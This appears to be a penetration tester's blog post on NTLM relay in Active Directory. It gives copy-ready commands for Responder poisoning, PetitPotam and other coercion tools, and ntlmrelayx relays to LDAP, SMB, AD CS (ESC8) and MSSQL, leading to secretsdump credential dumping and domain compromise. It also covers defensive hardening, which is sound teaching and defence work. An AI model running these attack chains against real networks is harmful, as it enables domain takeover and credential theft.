---
title: "NTLM Relay Attacks: The Bug That Won't Die"
date: 2026-03-26T06:00:00-05:00
draft: true
author: Justin
tags: ["security", "active-directory", "ntlm", "windows"]
description: "NTLM relay is a 30-year-old protocol flaw that still pops domains in 2026. Coercion, relay targets, real attack chains, and the defenses that actually matter."
ShowToc: true
TocOpen: true
---

NTLM relay has been a known attack since the late 1990s. It's 2026 and it still works in most Active Directory environments I test. Not because defenders are incompetent, but because Microsoft built a protocol with no concept of endpoint identity, spent two decades bolting on optional mitigations, and left the defaults wide open. Every few years someone discovers a new coercion primitive, the security community lights up Twitter for a week, Microsoft patches the specific RPC call, and the underlying problem remains untouched.

This post covers how the attack actually works at the protocol level, the practical attack chains that matter today, and the defenses that close it for real. If you're still relying on "we'll deprecate NTLM eventually" as a strategy, I have bad news.

## NTLM authentication in 60 seconds

NTLM is a challenge-response protocol. Three messages, carried inside whatever application protocol is doing the authentication (SMB, HTTP, LDAP, MSSQL, etc.):

```
Client → Server:  Type 1 (NEGOTIATE)
    Flags indicating supported features. "Let's do this."

Server → Client:  Type 2 (CHALLENGE)
    An 8-byte random challenge, target info, and negotiated flags.

Client → Server:  Type 3 (AUTHENTICATE)
    Username, domain, and a response computed by HMAC-MD5'ing
    the server challenge + client data with the user's NT hash.
```

The server receives Type 3, looks up the user's NT hash (or forwards to a DC via Netlogon for verification), recomputes the HMAC, and checks if it matches. If it does, you're in.

The fatal flaw: nothing in these messages binds the authentication to a specific server. The Type 3 response proves the client knows the password. It does not prove the client intended to talk to *this* server. The challenge is just 8 random bytes. Any server could have issued it.

## What relay actually does

The attacker doesn't sit between an existing conversation. They open *two* separate connections: one where the victim authenticates to the attacker, and one where the attacker authenticates to a target by forwarding the victim's NTLM messages.

```
Victim ────────→ Attacker ────────→ Target
       Type 1  →         → Type 1
       Type 2  ←         ← Type 2
       Type 3  →         → Type 3
                           ✓ Authenticated as Victim
```

The target issues a challenge, the attacker passes it to the victim, the victim signs it (thinking they're authenticating to the attacker's service), and the attacker forwards the signed response to the target. The target sees a valid authentication for the victim's account. The attacker now has an authenticated session on the target as the victim.

This is not a man-in-the-middle attack. It's closer to a confused deputy problem. The victim willingly authenticates; they just don't realize their credentials are being used somewhere else.

## Step one: getting someone to authenticate to you

Relay needs inbound authentication. You need a victim to connect to you. There are two broad approaches: passive poisoning and active coercion.

### Passive: Responder and name resolution poisoning

When Windows can't resolve a hostname via DNS, it falls back to broadcast protocols: LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service). These protocols ask the local network segment "does anyone know where `fileserver01` is?" and trust whoever answers first.

Responder answers all of them. Every failed DNS lookup on the network segment becomes an authentication attempt to your machine.

```bash
# Start Responder in analysis mode first to see what's happening
sudo responder -I eth0 -A

# When ready to capture/relay, run without analysis mode
# Disable Responder's built-in SMB/HTTP servers so ntlmrelayx can bind those ports
sudo responder -I eth0 -w -F -P --disable-ess
```

The problem with Responder for relay (vs. just hash capture) is that you get whatever random user happens to fat-finger a hostname or hit a stale shortcut. You can't target specific high-privilege accounts. That's where coercion comes in.

### Active: coercion primitives

Coercion forces a specific machine to authenticate to you on demand. You trigger an RPC call that makes the target machine connect back to a UNC path you control, and the machine authenticates with its computer account. Computer accounts for domain controllers have DCSync privileges. That's why coercion-to-relay is a domain compromise chain.

**PetitPotam (MS-EFSRPC):**

The one that changed everything. Calls `EfsRpcOpenFileRaw` on a remote host, pointing to your listener. On unpatched systems, this works without authentication, meaning you can coerce a DC from an unauthenticated network position.

```bash
# Unauthenticated coercion (unpatched targets)
python3 PetitPotam.py <listener_ip> <target_dc_ip>

# Authenticated coercion (works on patched systems with valid creds)
python3 PetitPotam.py -u 'lowpriv' -p 'Password123' -d corp.local \
    <listener_ip> <target_dc_ip>
```

Microsoft has patched the unauthenticated path multiple times, but authenticated coercion still works. And there are other EFS functions beyond `EfsRpcOpenFileRaw` that researchers keep finding.

**PrinterBug (MS-RPRN):**

`RpcRemoteFindFirstPrinterChangeNotificationEx` tells a print spooler "notify this UNC path when something changes." The target authenticates to your path. Requires domain credentials but works reliably against any machine running the Spooler service.

```bash
# Requires domain creds
python3 printerbug.py corp.local/lowpriv:'Password123'@<target_dc_ip> <listener_ip>
```

**DFSCoerce (MS-DFSNM):**

Same pattern, different RPC interface. Abuses Distributed File System operations to trigger authentication.

```bash
python3 dfscoerce.py -u 'lowpriv' -p 'Password123' -d corp.local \
    <listener_ip> <target_dc_ip>
```

**Coercer** wraps many of these into a single tool that tests multiple RPC methods automatically:

```bash
# Test all known coercion methods
python3 Coercer.py -u 'lowpriv' -p 'Password123' -d corp.local \
    -l <listener_ip> -t <target_dc_ip>
```

## Step two: relaying to something useful

Getting authentication is half the problem. You need a target service that (a) accepts NTLM, (b) doesn't require message signing or channel binding, and (c) lets you do something useful with the relayed identity.

### Relay to LDAP: ACL abuse and RBCD

LDAP is the most versatile relay target. With a relayed computer account (especially a DC), you can modify Active Directory objects. The classic plays:

**Resource-Based Constrained Delegation (RBCD):** Add an attacker-controlled computer to a target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Then use S4U2Self/S4U2Proxy to impersonate any user to that target.

```bash
# Set up ntlmrelayx to write RBCD when it gets a relay
impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access

# In another terminal, trigger coercion
python3 PetitPotam.py <relay_ip> <target_server_ip>
```

ntlmrelayx will create a new machine account (if the domain allows it, which it does by default up to `ms-DS-MachineAccountQuota` of 10) and configure RBCD on the target. Then you finish the attack:

```bash
# Get a service ticket impersonating admin to the target
impacket-getST -spn cifs/target.corp.local -impersonate administrator \
    -dc-ip <dc_ip> 'corp.local/YOURCOMPUTER$:ComputerPassword'

# Use the ticket
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass target.corp.local
```

**Shadow Credentials:** Write to the target's `msDS-KeyCredentialLink` attribute, then use PKINIT to authenticate as that account. Same relay setup, different flag:

```bash
impacket-ntlmrelayx -t ldap://dc01.corp.local --shadow-credentials --shadow-target 'target$'
```

LDAP relay works because LDAP signing is not enforced by default. Microsoft announced they'd change this default starting in 2024, then delayed it. As of early 2026, many environments still have `LDAPServerIntegrity = 1` (negotiate signing, but don't require it). The relay tool simply doesn't negotiate signing, and the server accepts the unsigned session.

### Relay to SMB: direct execution

If the relayed account has admin rights on the target and SMB signing isn't required, you get code execution.

```bash
# Relay to SMB with command execution
impacket-ntlmrelayx -t smb://target.corp.local -c 'whoami > C:\relay-proof.txt'

# Or get an interactive shell via socks proxy
impacket-ntlmrelayx -t smb://target.corp.local -socks
```

The socks mode is underrated. ntlmrelayx holds the authenticated session open and exposes it as a SOCKS proxy. You can then pipe other impacket tools through it:

```bash
# Use the relayed session through the SOCKS proxy
proxychains impacket-secretsdump corp.local/victim@target.corp.local -no-pass
```

SMB signing is required by default on domain controllers but not on member servers. That asymmetry is why relay-to-SMB still works against workstations and non-DC servers in most environments.

### Relay to AD CS HTTP enrollment: the domain kill chain (ESC8)

This is the big one. If Active Directory Certificate Services has the web enrollment endpoint enabled (it does by default when you install the CA Web Enrollment role), and EPA isn't configured (it isn't by default), you can relay to it and request certificates.

The full chain from zero to domain admin:

```bash
# 1. Find ADCS servers and vulnerable templates
certipy find -u lowpriv@corp.local -p 'Password123' -dc-ip <dc_ip> -vulnerable

# 2. Start ntlmrelayx targeting the ADCS web enrollment endpoint
impacket-ntlmrelayx -t http://<adcs_server>/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# 3. Coerce a domain controller to authenticate to you
python3 PetitPotam.py <relay_ip> <dc_ip>
```

ntlmrelayx catches the DC's authentication, relays it to the ADCS web enrollment page, and requests a certificate using the DomainController template. You get a base64-encoded certificate for the DC's machine account.

```bash
# 4. Authenticate using the certificate
certipy auth -pfx dc01.pfx -dc-ip <dc_ip>

# 5. You now have the DC's NT hash. DCSync the domain.
impacket-secretsdump -hashes :<dc_nt_hash> corp.local/dc01\$@<dc_ip>
```

One coerced authentication, one relay, full domain compromise. The entire chain takes about 30 seconds to execute once you have the setup ready. This is why ESC8 keeps showing up in every AD pentest report.

### Relay to MSSQL

Less common but still useful. If you can relay to a SQL server, you get query execution as the relayed identity. Useful for data access or `xp_cmdshell` if it's enabled.

```bash
impacket-ntlmrelayx -t mssql://sql01.corp.local -q "SELECT SYSTEM_USER;"
```

## Why the MIC didn't save us

Microsoft added the Message Integrity Code (MIC) to NTLM to detect message tampering during relay. The MIC is an HMAC over all three Type messages keyed with the session base key. If the attacker modifies a message (like stripping signing flags from Type 1), the MIC check fails.

The problem: the MIC is signaled by an `MsvAvFlags` field in the Type 2 `TargetInfo`. Early bypass? Remove the `MsvAvFlags` from Type 2 before forwarding to the victim. The victim doesn't know a MIC was expected, so it doesn't compute one, and the server can't verify something that was never sent.

Microsoft fixed this by adding timestamp validation and making MIC checks mandatory in certain scenarios, but the rollout was gradual and not all services enforce it consistently. The MIC helps, but it doesn't solve the fundamental problem: NTLM has no channel binding.

## Defenses that actually close the door

Let's be specific about what works and what doesn't.

### SMB signing (required, not just negotiated)

Set via GPO:

```
Computer Configuration → Policies → Windows Settings → Security Settings →
Local Policies → Security Options →
"Microsoft network server: Digitally sign communications (always)" → Enabled
```

This kills SMB relay. The authentication succeeds, but the attacker can't sign subsequent SMB commands because they don't have the session key (derived from the NT hash). The target drops the connection after the first unsigned operation.

Enable this on all servers, not just DCs. DCs require signing by default. Member servers don't. That gap is what attackers exploit.

Performance overhead exists but is negligible on modern hardware. The "SMB signing causes 15% performance degradation" stat is from the Windows XP era. Test it, but don't let that myth stop you.

### LDAP signing and channel binding

Two separate settings, both needed:

```
# Registry on domain controllers
LDAPServerIntegrity = 2          # Require signing (not just negotiate)
LdapEnforceChannelBinding = 2    # Require channel binding tokens
```

LDAP signing prevents unsigned LDAP relay. Channel binding ties the NTLM auth to the specific TLS session, preventing relay to LDAPS. You need both.

Microsoft has been saying they'll enforce LDAP signing by default since 2020. The actual enforcement keeps getting pushed back. Don't wait for them. Set it yourself and test for breakage. Anything that breaks was authenticating insecurely.

### EPA on ADCS and other HTTP services

Extended Protection for Authentication adds a channel binding token derived from the TLS session to the NTLM authentication. The server verifies that the token matches its TLS session. Since the attacker has a different TLS session with the target than the victim has with the attacker, the tokens don't match and relay fails.

For ADCS web enrollment specifically:

```powershell
# Enable EPA on the CertSrv virtual directory in IIS
# IIS Manager → Sites → Default Web Site → CertSrv → Authentication →
# Windows Authentication → Advanced Settings → Extended Protection: Required

# Or via PowerShell
Set-WebConfigurationProperty -PSPath 'MACHINE/WEBROOT/APPHOST/Default Web Site/CertSrv' `
    -Filter 'system.webServer/security/authentication/windowsAuthentication' `
    -Name 'extendedProtection.tokenChecking' -Value 'Require'
```

This single change kills ESC8. Yet most environments I test haven't done it.

### Disabling NTLM entirely

The correct long-term fix. If nothing uses NTLM, there's nothing to relay.

Windows 11 24H2 and Server 2025 reduce NTLM usage significantly. Kerberos now has fallback mechanisms that handle most cases where NTLM was previously required (IP-based access, cross-forest scenarios). But full NTLM deprecation requires auditing every application, service, and integration in your environment. For large enterprises, this is a multi-year project.

Start with NTLM auditing:

```powershell
# Enable NTLM audit logging
# GPO: Computer Configuration → Windows Settings → Security Settings →
# Local Policies → Security Options →
# "Network security: Restrict NTLM: Audit NTLM authentication in this domain" → Enable all

# Then review events in:
# Applications and Services Logs → Microsoft → Windows → NTLM → Operational
```

Find what's still using NTLM, fix or replace those integrations, then start restricting. Don't just flip the switch or you'll break production in ways that are annoying to troubleshoot at 2 AM.

### Disabling coercion vectors

Patch MS-EFSRPC (PetitPotam). Disable the Print Spooler on servers that don't need it (this is basically all DCs). Restrict RPC access using RPC filters. These are targeted mitigations that reduce the attack surface but don't fix the root cause. Useful as defense-in-depth, insufficient on their own, because new coercion primitives keep getting discovered.

## Why this still works in 2026

The honest answer: defaults.

SMB signing isn't required on member servers. LDAP signing enforcement keeps getting delayed. EPA on ADCS isn't enabled by default. NTLM is still enabled everywhere. Every one of these has been a known issue for years. The fixes exist. They're just not turned on.

There's also the complexity problem. Active Directory environments accumulate legacy configurations over decades. That one LOB application from 2009 that only speaks NTLMv1, the vendor appliance that breaks with LDAP signing, the third-party SSO integration that doesn't support channel binding. Each one becomes a reason to delay hardening. The result is that the 2026 attack surface looks remarkably similar to 2020.

Microsoft's approach has been incremental: add optional protections, announce future enforcement dates, delay those dates, repeat. The NTLM deprecation roadmap is real and progressing, but "we'll enforce it in a future update" has been the story for half a decade. Meanwhile, every red team engagement I run still finds at least one viable relay path.

## The practical takeaway

If you're on offense: coerce → relay → ADCS is still the fastest path to domain admin in most environments. Carry PetitPotam, ntlmrelayx, and certipy. Enumerate ADCS configurations early. Check for SMB signing on member servers. Test LDAP signing on DCs.

If you're on defense: enforce SMB signing on all servers, enforce LDAP signing and channel binding on DCs, enable EPA on every IIS endpoint (especially ADCS), audit NTLM usage and start restricting it, and disable the Print Spooler on DCs. These are concrete, testable changes. You can validate each one with the same tools attackers use.

NTLM relay is not a sophisticated attack. It's a protocol flaw from the 1990s that the industry has been too slow to remediate. The tools are public, the techniques are well-documented, and the defenses are available today. The gap isn't knowledge. It's implementation.
